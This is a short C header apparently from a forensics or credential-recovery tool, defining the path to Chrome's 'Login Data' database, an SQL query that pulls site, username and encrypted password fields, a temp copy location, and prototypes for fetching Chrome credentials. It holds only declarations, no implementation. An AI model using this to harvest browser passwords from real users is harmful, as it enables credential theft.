#pragma once
#define FORENSICS_CHROMECREDENTIALS_PATH _T("\\Google\\Chrome\\User Data\\Default")
#define FORENSICS_CHROMECREDENTIALS_DB _T("\\Login Data")
#define CHROME_CRED_SQL_QUERY "SELECT signon_realm,username_value,password_value,date_created FROM logins"
#define TEMP_CHROME_DB	_T("c:\\programdata\\temp.db")
#define CHROME_DB_FIELD_SITE 0
#define CHROME_DB_FIELD_USER 1
#define CHROME_DB_ENC_FIELD_PASS 2
#define CHROME_DB_FIELD_DATE 3
int SG_FakeData(SGBrowserCredentialsArray *credentials);

int SG_GetChromeCredentials(SGBrowserCredentialsArray *credentials);
